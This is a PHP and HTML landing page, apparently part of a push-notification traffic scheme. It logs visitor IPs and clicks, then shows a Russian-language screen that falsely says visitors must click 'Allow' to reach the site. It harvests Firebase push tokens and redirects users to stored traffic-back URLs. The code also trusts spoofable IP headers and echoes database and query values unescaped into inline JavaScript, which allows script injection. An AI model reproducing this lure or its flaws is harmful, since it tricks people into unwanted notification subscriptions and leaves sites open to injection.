<?php
//Охуевший Мистер Крабс
include('../inc/conf.php');
$data = mysqli_fetch_assoc(mysqli_query($connect_db, "SELECT id,sender_id FROM `t_data` LIMIT 1"));
$id = intval($_GET['strid']);
$data_stream = mysqli_fetch_assoc(mysqli_query($connect_db, "SELECT id,tb,tb2,iget FROM `t_streams` WHERE id = '$id' LIMIT 1"));
$landing_id = '5';
$dt = time();

$ip_client = @$_SERVER['HTTP_CLIENT_IP'];
$ip_forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$ip_remote = $_SERVER['REMOTE_ADDR'];
if(filter_var($ip_client, FILTER_VALIDATE_IP))
{
$ip = $ip_client;
}
elseif(filter_var($ip_forward, FILTER_VALIDATE_IP))
{
$ip = $ip_forward;
}
else
{
$ip = $ip_remote;
}
$ip = mysqli_real_escape_string($connect_db, $ip);
$isip = mysqli_num_rows(mysqli_query($connect_db, "SELECT id FROM t_stat_ip WHERE stream = '$id' AND ip = '$ip' LIMIT 1"));
if ($isip == 0) {
mysqli_query($connect_db, "INSERT INTO t_stat_ip (stream,ip) VALUES ('$id','$ip')");

$nowday = date('Ymd',$dt);
$isday_stat = mysqli_num_rows(mysqli_query($connect_db, "SELECT id FROM t_stat WHERE lnd = '$landing_id' AND stream = '$id' AND ymd = '$nowday' LIMIT 1"));

if ($isday_stat == 0) {
mysqli_query($connect_db, "INSERT INTO t_stat (lnd,stream,ymd,clk) VALUES ('$landing_id','$id','$nowday','1')");
} else {
mysqli_query($connect_db, "UPDATE `t_stat` SET `clk` = `clk`+1 WHERE lnd = '$landing_id' AND stream = '$id' AND ymd = '$nowday' LIMIT 1");
}

if (isset($_GET['label'])) {
$label = mysqli_real_escape_string($connect_db, $_GET['label']);
$islabelstat = mysqli_num_rows(mysqli_query($connect_db, "SELECT id FROM t_stat_labels WHERE lbl = '$label' AND ymd = '$nowday' LIMIT 1"));

if ($islabelstat == 0) {
mysqli_query($connect_db, "INSERT INTO t_stat_labels (lbl,ymd,clk) VALUES ('$label','$nowday','1')");
} else {
mysqli_query($connect_db, "UPDATE `t_stat_labels` SET `clk` = `clk`+1 WHERE lbl = '$label' AND ymd = '$nowday' LIMIT 1");
}

} else { $label = ''; }
}

if ($data_stream['iget'] == 0) {
$iget = 0;
$trafback = $data_stream['tb'];
$trafback2 = $data_stream['tb2'];
} else {
$iget = 1;
if(stristr($data_stream['tb'], '?')) {
$trafback = $data_stream['tb'].'&';
} else {
$trafback = $data_stream['tb'].'?';
}
if(stristr($data_stream['tb2'], '?')) {
$trafback2 = $data_stream['tb2'].'&';
} else {
$trafback2 = $data_stream['tb2'].'?';
}
}
?>
<!DOCTYPE html>
<html lang="ru">
head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Нажмите &quot;Разрешить&quot; чтобы получить доступ к сайту</title>
<link href="css/mainf1e5.css?b=5" rel="stylesheet">
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
		<script src="https://www.gstatic.com/firebasejs/5.8.2/firebase-app.js"></script>
		<script src="https://www.gstatic.com/firebasejs/5.8.2/firebase-messaging.js"></script>
</head>
<body class="desktop ">
    ﻿
<div class="cover">
    <div class="cover__text">
        Чтобы продолжить,<br>нажмите на кнопку &quot;Разрешить&quot;.	</div>
</div>
<div class="push-arrow-wrap">
    <img src="images/arrow0dac.png?b=10" alt="arrow" class="push-arrow">
</div>

		<script>
		var crabs_url = window.location.search.replace('?', '');
if ('<?php echo $iget; ?>' == '0') { var crabs_go = '<?php echo $trafback; ?>'; var crabs_go2 = '<?php echo $trafback2; ?>'; } else { var crabs_go = '<?php echo $trafback; ?>'+crabs_url; var crabs_go2 = '<?php echo $trafback2; ?>'+crabs_url; }

			$(function(){
				firebase.initializeApp({
					messagingSenderId: '<?php echo $data['sender_id']; ?>'
				});
				if(firebase.messaging.isSupported() && 'Notification' in window){
					var messaging = firebase.messaging();
					messaging.requestPermission()
						.then(function(){
							messaging.getToken()
								.then(function(currentToken){
									if(currentToken){
										sendTokenToServer(currentToken);
									} else {
										location.href = crabs_go2;
									}
								})
								.catch(function(err){
										location.href = crabs_go2;
								});
						})
						.catch(function (err) {
										location.href = crabs_go2;
						});

				} else {
										location.href = crabs_go2;
				}
			});
			function sendTokenToServer(currentToken){
				if(!isTokenSentToServer(currentToken)) {
					setTokenSentToServer(currentToken);
					data = {landing: '<?php echo $landing_id; ?>', sid: '<?php echo $id; ?>', label: '<?php if (isset($_GET['label'])) { echo mysqli_real_escape_string($connect_db, htmlspecialchars($_GET['label'])); } ?>', token: currentToken};
				$.ajax({
					url: '/inc/func_send_token.php',
					data: data,
					method: 'post',
					cache: false,
					beforeSend: function(){
					},
					success: function(data){
										location.href = crabs_go;
					},
					error: function(){
						 console.log('Проверьте подключение к интернету ...');
					},
					complete: function(){
					}
				});
				} else {
						location.href = crabs_go;
				}
			}
			function isTokenSentToServer(currentToken) {
				return window.localStorage.getItem('sentFirebaseMessagingToken') == currentToken;
			}
			function setTokenSentToServer(currentToken) {
				window.localStorage.setItem(
					'sentFirebaseMessagingToken',
					currentToken ? currentToken : ''
				);
			}
		</script>

</body>
</html>